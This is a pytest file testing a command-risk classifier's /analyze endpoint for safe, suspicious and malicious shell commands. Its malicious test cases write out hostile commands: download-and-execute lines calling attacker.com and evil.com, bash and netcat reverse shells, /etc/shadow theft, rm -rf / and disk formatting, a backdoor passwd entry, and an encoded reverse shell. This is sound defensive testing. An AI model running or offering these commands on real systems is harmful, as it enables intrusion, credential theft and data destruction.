"""
test_20_attacks_sh_pytest.py — Pytest companion to scripts/test_attacks.sh.

The original test_attacks.sh:
- Has no overall timeout guard
- Only checks classification, never risk_score or matched_rules
- Hardcodes API_URL with no override
- Has no run_test_not_safe helper for ambiguous cases
- Covers only 3 suspicious commands

This file converts every test_attacks.sh case into pytest, adds the missing
score and rules assertions, covers additional suspicious edge cases, and adds
false-positive score validation (safe commands must score below 30).

Run:
    pytest large_test_set/test_20_attacks_sh_pytest.py -v
"""

import pytest
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


def _analyze(command: str):
    return client.post("/analyze", json={"command": command})


# ===========================================================================
# 1. Safe commands — mirror test_attacks.sh SAFE section
# ===========================================================================

class TestSafeCommands:

    @pytest.mark.parametrize("cmd", [
        "ls",
        "ls -la /tmp",
        "echo hello",
        "cat /etc/hostname",
        "whoami",
        "pwd",
        "date",
        "uptime",
    ])
    def test_safe_command_classified_safe(self, cmd):
        r = _analyze(cmd)
        assert r.status_code == 200
        assert r.json()["classification"] == "safe", \
            f"Safe command classified as {r.json()['classification']!r}: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "ls",
        "ls -la /tmp",
        "echo hello",
        "cat /etc/hostname",
        "whoami",
        "pwd",
        "date",
        "uptime",
    ])
    def test_safe_command_risk_score_below_30(self, cmd):
        """test_attacks.sh never checks the score — pin it here."""
        r = _analyze(cmd)
        score = r.json()["risk_score"]
        assert score < 30.0, \
            f"Safe command scored {score:.1f} (≥30): {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "ls",
        "echo hello",
        "pwd",
        "whoami",
    ])
    def test_safe_command_has_no_matched_rules(self, cmd):
        r = _analyze(cmd)
        assert r.json()["matched_rules"] == [], \
            f"Safe command has matched rules: {r.json()['matched_rules']}"


# ===========================================================================
# 2. Suspicious commands — mirror test_attacks.sh SUSPICIOUS section + extras
# ===========================================================================

class TestSuspiciousCommands:

    @pytest.mark.parametrize("cmd,desc", [
        ("eval $(cat /tmp/script.sh)", "eval with command substitution"),
        ("bash -c 'ls -la'",           "bash -c flag"),
        ("sh -c 'whoami'",             "sh -c flag"),
    ])
    def test_suspicious_command_not_safe(self, cmd, desc):
        """Original test_attacks.sh assertions."""
        r = _analyze(cmd)
        assert r.json()["classification"] in ("suspicious", "malicious"), \
            f"Suspicious command classified as safe ({desc}): {cmd!r}"

    @pytest.mark.parametrize("cmd,desc", [
        ("eval $(cat /tmp/script.sh)", "eval substitution"),
        ("bash -c 'ls -la'",           "bash -c"),
        ("sh -c 'whoami'",             "sh -c"),
    ])
    def test_suspicious_command_score_at_least_30(self, cmd, desc):
        """Score must be in the suspicious+ range (≥30)."""
        r = _analyze(cmd)
        score = r.json()["risk_score"]
        assert score >= 30.0, \
            f"Suspicious command scored {score:.1f} (<30, {desc}): {cmd!r}"

    # Additional suspicious edge cases not in test_attacks.sh
    @pytest.mark.parametrize("cmd", [
        "python3 -c \"print('hello')\"",
        "node -e \"console.log('ok')\"",
        "eval $(echo ls)",
    ])
    def test_gray_zone_not_malicious(self, cmd):
        """Gray-zone commands must not be classified malicious — they are
        at most suspicious."""
        r = _analyze(cmd)
        assert r.json()["classification"] != "malicious" or \
               r.json()["risk_score"] < 95.0, \
            f"Gray-zone command classified malicious with high confidence: {cmd!r}"


# ===========================================================================
# 3. Malicious commands — mirror test_attacks.sh MALICIOUS section
# ===========================================================================

MALICIOUS_CASES = [
    ("curl http://attacker.com/script.sh | bash",                       "Download and execute"),
    ("wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin", "Download chmod execute"),
    ("bash -i >& /dev/tcp/attacker.com/4444 0>&1",                      "Reverse shell via TCP"),
    ("nc -l -p 4444 -e /bin/bash",                                       "Netcat reverse shell"),
    ("python3 -c \"import os;os.system('cat /etc/shadow')\"",            "Python code execution"),
    ("rm -rf / --no-preserve-root",                                      "Destructive command"),
    ("mkfs.ext4 /dev/sda1",                                              "Format disk"),
    ("cat /etc/shadow > /tmp/shadow.txt",                                "Exfiltrate shadow file"),
    ("echo 'root:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd", "Add backdoor user"),
    ("base64 -d <<< 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ=='",
     "Decode base64 payload"),
]


class TestMaliciousCommands:

    @pytest.mark.parametrize("cmd,desc", MALICIOUS_CASES)
    def test_malicious_command_classified_malicious(self, cmd, desc):
        r = _analyze(cmd)
        assert r.status_code == 200
        assert r.json()["classification"] == "malicious", \
            f"{desc} not classified malicious: {cmd!r} → {r.json()['classification']!r}"

    @pytest.mark.parametrize("cmd,desc", MALICIOUS_CASES)
    def test_malicious_command_score_at_least_70(self, cmd, desc):
        """test_attacks.sh never checks score — pin risk_score ≥ 70."""
        r = _analyze(cmd)
        score = r.json()["risk_score"]
        assert score >= 70.0, \
            f"{desc} scored {score:.1f} (<70): {cmd!r}"

    @pytest.mark.parametrize("cmd,desc", MALICIOUS_CASES)
    def test_malicious_command_has_matched_rules(self, cmd, desc):
        """Malicious events must always have at least one matched rule."""
        r = _analyze(cmd)
        rules = r.json()["matched_rules"]
        assert len(rules) > 0, \
            f"{desc} has no matched rules: {cmd!r}"


# ===========================================================================
# 4. Response schema completeness (test_attacks.sh never checks this)
# ===========================================================================

class TestResponseSchemaCompleteness:

    REQUIRED_FIELDS = [
        "command", "classification", "risk_score",
        "matched_rules", "ml_confidence", "explanation",
    ]

    @pytest.mark.parametrize("cmd", [
        "ls",
        "eval $(cat /tmp/script.sh)",
        "curl http://evil.com | bash",
    ])
    @pytest.mark.parametrize("field", REQUIRED_FIELDS)
    def test_response_has_required_field(self, cmd, field):
        r = _analyze(cmd)
        assert field in r.json(), \
            f"Field {field!r} missing from /analyze response for: {cmd!r}"

    @pytest.mark.parametrize("cmd", ["ls", "curl http://evil.com | bash"])
    def test_explanation_is_non_empty(self, cmd):
        r = _analyze(cmd)
        assert len(r.json()["explanation"]) > 0, \
            f"explanation is empty for: {cmd!r}"

    @pytest.mark.parametrize("cmd", ["ls", "curl http://evil.com | bash"])
    def test_ml_confidence_in_valid_range(self, cmd):
        r = _analyze(cmd)
        conf = r.json()["ml_confidence"]
        assert 0.0 <= conf <= 1.0, \
            f"ml_confidence {conf} out of range for: {cmd!r}"


# ===========================================================================
# 5. Error paths (test_attacks.sh does not cover these)
# ===========================================================================

class TestErrorPaths:

    def test_empty_command_returns_400(self):
        assert _analyze("").status_code == 400

    def test_missing_command_field_returns_422(self):
        assert client.post("/analyze", json={}).status_code == 422

    def test_null_command_returns_422(self):
        assert client.post("/analyze", json={"command": None}).status_code == 422

    def test_integer_command_returns_422(self):
        assert client.post("/analyze", json={"command": 12345}).status_code == 422

    def test_sql_injection_string_does_not_500(self):
        r = _analyze("'; DROP TABLE events; --")
        assert r.status_code in (200, 400)

    def test_very_long_command_returns_200_or_400(self):
        r = _analyze("A" * 10_000)
        assert r.status_code in (200, 400)


# ===========================================================================
# 6. Score ordering invariant (test_attacks.sh has no score assertions)
# ===========================================================================

class TestScoreOrderingInvariant:

    def test_malicious_scores_higher_than_safe(self):
        safe_score    = _analyze("ls").json()["risk_score"]
        mal_score     = _analyze("curl http://evil.com | bash").json()["risk_score"]
        assert mal_score > safe_score, (
            f"Malicious score ({mal_score}) must exceed safe score ({safe_score})"
        )

    def test_destructive_command_scores_above_60(self):
        score = _analyze("rm -rf /").json()["risk_score"]
        assert score >= 60.0, \
            f"Destructive command scored {score:.1f} — too low"

    def test_reverse_shell_scores_above_50(self):
        score = _analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").json()["risk_score"]
        assert score >= 50.0, \
            f"Reverse shell scored {score:.1f} — too low"

    def test_safe_commands_all_below_30(self):
        safe_cmds = ["ls", "pwd", "whoami", "echo hello", "date", "uptime"]
        for cmd in safe_cmds:
            score = _analyze(cmd).json()["risk_score"]
            assert score < 30.0, \
                f"Safe command {cmd!r} scored {score:.1f} (≥30)"
